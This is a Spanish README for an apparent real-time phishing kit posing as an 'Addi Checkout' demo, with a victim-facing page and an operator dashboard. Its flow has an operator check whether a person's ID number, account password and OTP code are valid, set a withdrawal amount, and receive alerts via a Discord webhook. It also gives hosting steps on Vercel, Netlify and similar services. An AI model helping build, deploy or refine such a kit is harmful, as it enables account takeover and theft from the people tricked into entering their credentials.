# Addi Checkout — Demo con Firebase

Flujo de desembolso con **validación del asesor en tiempo real** por sesiones (Firestore).

## 📁 Archivos
| Archivo | Qué es |
|---|---|
| `index.html` | Checkout del cliente (flujo de desembolso) |
| `dashboard.html` | Panel del asesor (valida, aprueba, define montos y OTP) |
| `firestore.rules.json` | Reglas de seguridad (pegarlas en la consola) |
| `*.svg` | Recursos (logo, loaders, whatsapp) |

## 🧩 Flujo actual (por sesiones — cada cliente = 1 doc en Firestore)
```
1. Cédula        → asesor: ✓ cuenta existe / ✗ cuenta no existe
2. Contraseña    → asesor: ✓ contraseña correcta / ✗ incorrecta
3. Monto retiro  → el asesor define cuánto retirar (input en el panel)
4. Procesando    → carga automática (sin aprobación)
5. OTP           → código aleatorio generado; el asesor lo ve y lo envía
                    "¿No recibiste el mensaje?" = reenvío con cooldown de 5 min
6. Validando OTP → asesor: ✓ código válido / ✗ código inválido
7. Cuotas 8. Confirmar 9. Identidad 10. Finalizando 11. Éxito  → aprobados uno a uno
```
> Las señales siempre se escriben en el **doc de la sesión seleccionada** en el dashboard: la sesión 1 nunca altera a la 2, 3, etc.

## 🔧 Requisitos en Firebase
1. Proyecto + **Firestore** creado
2. **Authentication → Sign-in method → Anónimo** habilitado

## ▶️ Probar en local
Firebase (módulos) **no funciona con `file://`** → usa un servidor HTTP:
```bash
# en la carpeta del proyecto:
python -m http.server 8000
```
- Asesor: `http://localhost:8000/dashboard.html`
- Cliente: `http://localhost:8000/index.html` (en otra pestaña u otro dispositivo de la red local)

## 🚀 Montar en internet
Sube **todos los archivos** a cualquier hosting estático:
- **Firebase Hosting**, Netlify, Vercel o GitHub Pages

## 🔐 Secretos fuera del código (webhook + contraseña del dashboard)
- El **webhook de Discord** y la **contraseña del dashboard** ya NO están en el repo/HTML.
- Se guardan como variables de entorno del servidor:
  **Vercel → Project → Settings → Environment Variables:**
  ```
  DISCORD_WEBHOOK = https://discord.com/api/webhooks/...
  DASH_PASS       = (la clave, ej. Dezuh2026)
  ```
- El cliente y el dashboard llaman a **`/api/notificar`** (reenvía a Discord) y **`/api/login`** (valida la clave). Los secretos nunca salen del servidor.

### ▶️ Para probar lo seguro en local
```bash
vercel dev   # levanta todo e inyecta las variables de entorno
```
(Si pruebas con `python -m http.server` o `file://`, el webhook y el login necesitan estar desplegados o usar `vercel dev`.)

## 🔒 Seguridad (30 días del modo de prueba)
1. Firestore → **Rules** → pega el contenido de `firestore.rules.json`
2. Cambia `'CAMBIA-ESTE-TOKEN'` por un token tuyo (en las reglas **y** en `dashboard.html` → `ADMIN_TOKEN`)

## ⚠️ Pendiente para producción real
- El **código OTP se genera en el navegador del cliente** (se puede inspeccionar); ocultarlo requiere un backend/Cloud Function que lo genere.
- El **`ADMIN_TOKEN`** de Firestore sigue en `dashboard.html` y en `firestore.rules.json`; el siguiente nivel es moverlo a un `/api/cmd` con credenciales de Admin SDK (te lo dejo anotado por si lo quieres).